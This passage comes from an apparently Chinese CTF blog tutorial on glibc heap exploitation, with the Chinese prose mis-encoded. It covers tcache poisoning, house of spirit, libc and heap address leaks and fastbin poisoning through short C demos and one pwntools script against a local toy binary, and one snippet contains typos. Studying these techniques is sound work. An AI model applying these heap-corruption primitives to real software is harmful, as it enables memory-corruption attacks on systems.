class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> localVariables ;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;localVariables addr is %p\n&quot;</span>, &amp;localVariables);<br><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> * ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc ptr addr is %p\n&quot;</span>, ptr);<br>    <span class="hljs-built_in">free</span>(ptr);<br>    <span class="hljs-comment">// åªéœ€ä¿®æ”¹fdæŒ‡é’ˆï¼Œç”³è¯·çš„å¤§å°å’Œå½“å‰tcache binå¤§å°ç›¸åŒå³å¯</span><br>    ptr[<span class="hljs-number">0</span>] = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)&amp;localVariables;<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the second malloc addr is %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcachePoisoning.png"></p><h5 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h5><p>tcache house of spirit è¿™ç§åˆ©ç”¨æ–¹å¼æ˜¯ç”±äº tcache_put() å‡½æ•°æ£€æŸ¥ä¸ä¸¥æ ¼å¯¼è‡´çš„ï¼Œåœ¨é‡Šæ”¾çš„æ—¶å€™æ²¡æœ‰æ£€æŸ¥è¢«é‡Šæ”¾çš„æŒ‡é’ˆæ˜¯å¦çœŸçš„æ˜¯å †å—çš„ malloc æŒ‡é’ˆï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¼ªé€ ä¸€ä¸ª fake_chunk æ¥è·³è½¬åˆ°ç›®æ ‡åœ°å€ã€‚</p><p>åˆ©ç”¨æ€è·¯æ˜¯ä¼ªé€ ä¸€ä¸ª size ç¬¦åˆ tcache bin size çš„ fake_chunk ï¼Œä½¿ç¨‹åºåœ¨é‡Šæ”¾æ—¶è¯¯ä»¥ä¸ºä»–ä»¬å±äº tcache çš„ç®¡ç†èŒƒå›´ï¼Œå°±å®ç°äº†ä»»æ„åœ°å€çš„ç›®çš„çš„ã€‚</p><p>åŸç†å¤§è‡´å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fck[<span class="hljs-number">4</span>];<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// åˆå§‹åŒ–å †ç¯å¢ƒ</span><br>    <br>    <span class="hljs-comment">// ä¼ªé€ å‡å †å—ï¼Œè¯•å›¾é‡Šæ”¾åå†æ¬¡åˆ†é…å¾—åˆ°è¯¥åœ°å€çš„å †å—</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fck addr is %p\n&quot;</span>, fck+<span class="hljs-number">2</span>);<br>    fck[<span class="hljs-number">1</span>] = <span class="hljs-number">0x90</span>;<br>    <span class="hljs-built_in">free</span>(fck+<span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;now malloc addr is %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcacheHouseOfSpirit.png"></p><h4 id="æ³„éœ²åœ°å€"><a href="#æ³„éœ²åœ°å€" class="headerlink" title="æ³„éœ²åœ°å€"></a>æ³„éœ²åœ°å€</h4><p>åœ¨åšå †é¢˜æ—¶ï¼Œç»å¸¸ä¼šé‡åˆ°ä¿æŠ¤å…¨å¼€çš„æƒ…å†µï¼Œç‰¹åˆ«æ˜¯åœ°å€éšæœºåŒ–ä¿æŠ¤PIEï¼Œæˆ–è€…é¢˜ç›®æœ¬èº«æ²¡æœ‰æ˜æ˜¾å¯åˆ©ç”¨çš„æ‰“å°å‡½æ•°ï¼Œè¿™æ—¶å°±éœ€è¦é‡‡å–ä¸€äº›æœºåˆ¶æ¥æ³„éœ²å‡ºlibcåœ°å€æˆ–è€…å †åœ°å€ç­‰ã€‚</p><h5 id="æ³„éœ²libcåœ°å€"><a href="#æ³„éœ²libcåœ°å€" class="headerlink" title="æ³„éœ²libcåœ°å€"></a>æ³„éœ²libcåœ°å€</h5><p>æ³„éœ² libc åˆ©ç”¨çš„å°±æ˜¯ bin ä¸­åŒå‘é“¾è¡¨çš„æ€§è´¨ï¼Œå½“ä¸€ä¸ªå †å—è¢«åŠ å…¥é“¾è¡¨æ—¶ï¼Œå®ƒçš„ fd å’Œ bk æŒ‡é’ˆä¼šæŒ‡å‘ libc ä¸­çš„åœ°å€ã€‚åœ¨â€œç»•è¿‡ tcacheâ€ä¸­æˆ‘ä»¬å°±æ˜¯åˆ©ç”¨äº†è¿™ä¸ªç‰¹æ€§æ¥æ³„éœ²çš„ libc åœ°å€ã€‚</p><p>è¿˜æœ‰æ›´åŠ ç›´æ¥çš„æ–¹æ³•ï¼Œåªéœ€è¦è®©åˆ†é…å’Œé‡Šæ”¾çš„chunk å¤§äºç­‰äº 0x410å­—èŠ‚ï¼ˆè¶…è¿‡ tcache çš„èŒƒå›´ï¼‰å³å¯ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™æ—¶æˆ‘ä»¬éœ€è¦é˜²æ­¢é‡Šæ”¾çš„å †å—å’Œ top chunk åˆå¹¶ã€‚</p><p>åŸç†å¤§è‡´å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> * ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);  <span class="hljs-comment">// é˜²æ­¢å †å—åˆå¹¶</span><br>    <span class="hljs-built_in">free</span>(ptr);  <span class="hljs-comment">//é‡Šæ”¾çš„å †å—è¿›å…¥ unsorted bin</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak libc addr is %p\n&quot;</span>, (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcachelibc.png"></p><h5 id="æ³„éœ²-heap-åœ°å€"><a href="#æ³„éœ²-heap-åœ°å€" class="headerlink" title="æ³„éœ² heap åœ°å€"></a>æ³„éœ² heap åœ°å€</h5><p>é™¤äº†æ³„éœ² libc åœ°å€ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥æ³„éœ² heap åœ°å€ã€‚åœ¨æ³„éœ²å †åœ°å€ä»¥åï¼Œæˆ‘ä»¬ç¡®å®šå¥½ç›®æ ‡åœ°å€çš„åç§»ï¼Œå†é€šè¿‡ä¿®æ”¹ tcache bin çš„ fd æŒ‡é’ˆï¼Œå°±å¯ä»¥åœ¨ä¸‹æ¬¡åˆ†é…æ—¶åˆ†é…åˆ°æˆ‘ä»¬æƒ³è¦çš„å †å—ã€‚</p><blockquote><p>åœ¨ libc-2.28 ä¸­ï¼Œå¢åŠ äº†å¯¹ tcache äºŒæ¬¡é‡Šæ”¾çš„æ£€æŸ¥ï¼Œæ‰€ä»¥æ­¤ç§æ”»å‡»æ–¹æ³•åœ¨ libc-2.28 åŠå…¶æ›´é«˜ç‰ˆæœ¬ä¸­å¤±æ•ˆ</p></blockquote><p>åŸç†å¤§è‡´å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">free</span>(ptr);<br>    <span class="hljs-built_in">free</span>(ptr);  <span class="hljs-comment">// double free !!</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;heap addr is %p\n&quot;</span>, ptr[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>double free é”™è¯¯æç¤ºäº†ï¼Œæ¢äº†ä¸‰ä¸ªç‰ˆæœ¬çš„ Libc éƒ½æœ¨æœ‰ç”¨ï¼Œå…ˆæ”¾ç€ç¢°åˆ°é¢˜ç›®å†è¯´ğŸ«¥</p></blockquote><p>è¿˜æœ‰å¦ä¸€ç§æ–¹æ³•ï¼Œæˆ‘ä»¬åˆ©ç”¨ malloc ä¸ä¼šæ¸…é™¤å†…å­˜ç©ºé—´çš„ç‰¹æ€§ä»¥åŠ printf æ ¼å¼åŒ–å­—ç¬¦ä¸²é‡åˆ°å­—ç¬¦ â€œ\x00â€ æ‰ä¼šåœæ­¢çš„ç‰¹æ€§å»æ³„éœ² heap base ã€‚</p><p>é¢˜ç›®ç¤ºä¾‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">free</span>(p2);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    read(<span class="hljs-number">0</span>, p3, <span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, p3);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./heap&quot;</span>)<br>p.send(<span class="hljs-string">&quot;a&quot;</span>)<br>info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(info)<br>info = u64(info.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>heap_base = info &amp; <span class="hljs-number">0xfffffffffffff000</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;heap base: &quot;</span>, <span class="hljs-built_in">hex</span>(heap_base))<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcacheheap_exp.png"></p><h5 id="åˆ©ç”¨-tcache-bin-è®°å½•å †å—æ³„éœ²åœ°å€"><a href="#åˆ©ç”¨-tcache-bin-è®°å½•å †å—æ³„éœ²åœ°å€" class="headerlink" title="åˆ©ç”¨ tcache bin è®°å½•å †å—æ³„éœ²åœ°å€"></a>åˆ©ç”¨ tcache bin è®°å½•å †å—æ³„éœ²åœ°å€</h5><p>æœ‰çš„æ—¶å€™é¢˜ç›®ä¼šé™åˆ¶freeçš„æ¬¡æ•°ï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡å¤šæ¬¡é‡Šæ”¾æ¥å¡«æ»¡ tcache bin ã€‚è¿™ç§æƒ…å†µæˆ‘ä»¬å°±å¯ä»¥ç»“åˆ tcache bin çš„ç‰¹æ€§ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨åˆå§‹åŒ–å †çš„æ—¶å€™ï¼Œ tcache bin ä¼šç”Ÿæˆä¸€å— 0x250 å¤§å°çš„å †å—æ¥è®°å½•å±äº tcache bin å¤§å°çš„å †å—ä¿¡æ¯ã€‚æˆ‘ä»¬ä¿®æ”¹è¿™é‡Œçš„è®°å½•ï¼Œå°±å¯ä»¥æŠŠåç»­é‡Šæ”¾çš„å †å—æ”¾è¿› unsorted bin ä¸­ã€‚</p><p>æ–¹æ³•ä¸€ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr;<br><br>    ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<br><br>    <span class="hljs-comment">// double free</span><br>    <span class="hljs-built_in">free</span>(ptr);<br>    <span class="hljs-built_in">free</span>(ptr);<br><br>    <span class="hljs-comment">// malloc 3 ==&gt; tcache bin count = -1</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">free</span>(ptr);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸Šæ–¹ä»£ç ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡åˆ©ç”¨ double free è®©ä¸€ä¸ªå †å—è‡ªèº«æ„æˆå¾ªç¯ï¼Œç„¶å malloc 3æ¬¡åå°±å¯ä»¥è®© tcache bin çš„è®°å½•å˜ä¸º -1ï¼Œç”±äº libc æºä»£ç æ˜¯è®¤å®šä¸ºæ— ç¬¦å·æ•´å‹æ‰€ä»¥æ­¤æ—¶ä¹Ÿå°±æ˜¯ä¸€ä¸ªéå¸¸å¤§çš„æ•°ï¼Œè‡ªç„¶ä¹Ÿå°±è®¤ä¸ºè¯¥ tcache bin æ˜¯è¢«å¡«æ»¡äº†çš„ã€‚æœ€åå† free ç›¸åŒå¤§å°çš„å †å—ï¼Œå°±ä¼šè¢«é‡Šæ”¾åˆ°ç›¸åº”çš„binä¸­ã€‚<br>æ–¹æ³•äºŒï¼š</p><p>ç›´æ¥ä¿®æ”¹è®°å½•ä¿¡æ¯ã€‚åˆ©ç”¨double freeæ³„éœ²å‡ºheapåœ°å€ï¼Œè®¡ç®—åç§»å¹¶æ±‚å‡ºè®°å½•è¯¥tcache binçš„åœ°å€ï¼Œç„¶ååˆ©ç”¨tcache bin poisonå°†å †å—åˆ†é…åˆ°è¿™é‡Œè¿›è¡Œä¿®æ”¹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;srdlb.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr;<br>    <br>    ptr = malooc(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<br>    ptr[<span class="hljs-number">-74</span>]=<span class="hljs-number">0x0700000000000000</span>;    <span class="hljs-comment">//è¿™é‡Œæ˜¯æˆ‘ä»¬è‡ªå·±è®¡ç®—å‡ºçš„åç§»</span><br>    <span class="hljs-built_in">free</span>(ptr);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸Šæ–¹ä»£ç ä¸­æˆ‘ä»¬å°†è®°å½•å—ä¿®æ”¹ä¸º0x07è¿™æ ·å°±ä¼šè¢«è®¤ä¸ºæ˜¯å·²ç»å¡«æ»¡äº†ä¸ƒå—å †å—ï¼Œä¸‹ä¸€ä¸ª free æ‰çš„å †å—å°±ä¼šè¿›å…¥ç›¸åº”çš„åŒºåŸŸã€‚</p><h4 id="tcache-extend"><a href="#tcache-extend" class="headerlink" title="tcache extend"></a>tcache extend</h4><p>å…¶å®å°±æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡é‡Šæ”¾å †å—åå¯¹å…¶æ•°æ®è¿›è¡Œä¿®æ”¹ã€‚å…¶ä¸­ç”±äºtcacheæœºåˆ¶çš„åŠ å…¥ä½¿å¾—æ¼æ´åˆ©ç”¨æ›´ç®€å•ã€‚chunk extend ä¹Ÿæ›´åŠ çš„è½»æ¾ï¼Œåªéœ€è¦ä¿®æ”¹å½“å‰chunkçš„sizeï¼Œæˆ‘ä»¬freeå†mallocåå°±å¯ä»¥è·å¾—å¯¹åº”å¤§å°çš„chunkã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;addr is %p, size is %p\n&quot;</span>, p1, p1[<span class="hljs-number">-1</span>]);<br>    p1[<span class="hljs-number">-1</span>] = <span class="hljs-number">0xa1</span>;<br>    <span class="hljs-built_in">free</span>(p1);<br>    p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;addr is %p, size is %p\n&quot;</span>, p1, p1[<span class="hljs-number">-1</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcache_extend2.png"></p><h1 id="Fastbin-attack"><a href="#Fastbin-attack" class="headerlink" title="Fastbin attack"></a>Fastbin attack</h1><blockquote><p>è¿™ä¸€éƒ¨åˆ†æˆ‘çš„ç¯å¢ƒæ˜¯ ubuntu16 libc2.23</p></blockquote><p>ç®€å•å›é¡¾ä¸€ä¸‹ fast bin çš„ç‰¹æ€§ï¼š</p><ul><li>å±äºfast bin çš„ chunk å¤§å°åœ¨ 64 ä½ä¸‹æ˜¯ 0x20-0x80ï¼Œæ¯ä¸€æ¡ bin é“¾è¡¨ä»¥ 0x10 é€’å¢ï¼Œå…±è®¡ä¸ƒæ¡é“¾ï¼›32 ä½æ˜¯ 0x10-0x40 ï¼Œä»¥ 0x8 é€’å¢ã€‚</li><li>fast bin æ˜¯å•é“¾è¡¨ä¸”å…ˆè¿›åå‡ºï¼Œå°±æ˜¯è¯´åœ¨ fast bin ä¸­åªæœ‰ fd æŒ‡é’ˆä¼šè¢«ä½¿ç”¨ã€‚</li><li>å±äº fast bin çš„ chunk è¢«é‡Šæ”¾æ—¶ä¸ä¼šè¢« unlink ï¼Œä¸ä¼šå’Œå †å—è¿›è¡Œåˆå¹¶ï¼Œå³ä½¿ç´§é‚» Top chunkã€‚</li></ul><h3 id="fast-bin-posioning"><a href="#fast-bin-posioning" class="headerlink" title="fast bin posioning"></a>fast bin posioning</h3><blockquote><p>å…¶å®å’Œä¹‹å‰ tcache çš„æ–¹æ³•æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡æˆ‘ä»¬ç°åœ¨çš„ç¯å¢ƒæ˜¯ libc2.23 æ²¡æœ‰ tcacheğŸ˜Š</p></blockquote><p>è¿™ç§æ”»å‡»æ–¹æ³•çš„ç›®çš„å°±æ˜¯å°†å †å—åˆ†é…åˆ°æˆ‘ä»¬æƒ³è¦æ§åˆ¶çš„å†…å­˜åŒºåŸŸï¼Œå†é€šè¿‡é¢˜ç›®æ‰€ç»™çš„ç¼–è¾‘å †å—çš„åŠŸèƒ½æ¥ä¿®æ”¹è¿™ä¸€éƒ¨åˆ†çš„å†…å­˜åŒºåŸŸã€‚</p><p>å®ç°æ”»å‡»ç›®æ ‡ï¼Œé¦–å…ˆè¦åœ¨ç›®æ ‡åŒºåŸŸä¸ºé€ å‡ºä¸€ä¸ªå †å—ï¼Œå°†ä¼ªé€ å †å—çš„sizeå¤§å°è®¾ç½®ä¸ºè¦ç”³è¯·çš„chunkå¤§å°+0x10ï¼Œç„¶åå°†ä¼ªé€ å †å—çš„åœ°å€å¡«å…¥å¯¹åº”å¤§å°çš„biné“¾ä¸­ï¼Œä¹‹åæ­£å¸¸ç”³è¯·å †å—å³å¯ã€‚</p><p>å¤§è‡´åŸç†å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fck[<span class="hljs-number">4</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;stack addr is %p\n&quot;</span>, fck);<br><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">free</span>(ptr);<br>    fck[<span class="hljs-number">1</span>] = <span class="hljs-number">0x21</span>;           <br>    ptr[<span class="hljs-number">0</span>] = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fck;  <span class="hljs-comment">//æŠŠfckæŒ‡é’ˆå†™å…¥fdæŒ‡é’ˆ</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the original heap %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;alloc to the stack %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastbp.png"></p><p>å¦‚ä¸Šä»£ç ï¼Œæˆ‘ä»¬ä¿®æ”¹äº† fd æŒ‡é’ˆï¼Œä½¿å¾— fd æŒ‡é’ˆæŒ‡å‘äº† ptr[0]ã€‚è¿™æ ·æˆ‘ä»¬å†æ¬¡åˆ†é…å¤§å°ä¸º 0x10 çš„å †å—æ—¶ï¼Œä¼šä»è¢«ä¿®æ”¹çš„ fd æŒ‡é’ˆæŒ‡å‘çš„åœ°å€å¤„è·å–å †å—ï¼Œå¹¶è¿”å›ç»™æˆ‘ä»¬ã€‚</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastbp_gdb1.png"></p><blockquote><p>å› ä¸ºæˆ‘ä»¬å†™å…¥åˆ° fd æŒ‡é’ˆçš„æ˜¯ fck çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯ä¼ªé€ å †å—çš„å¤´åœ°å€ï¼Œè€Œ malloc 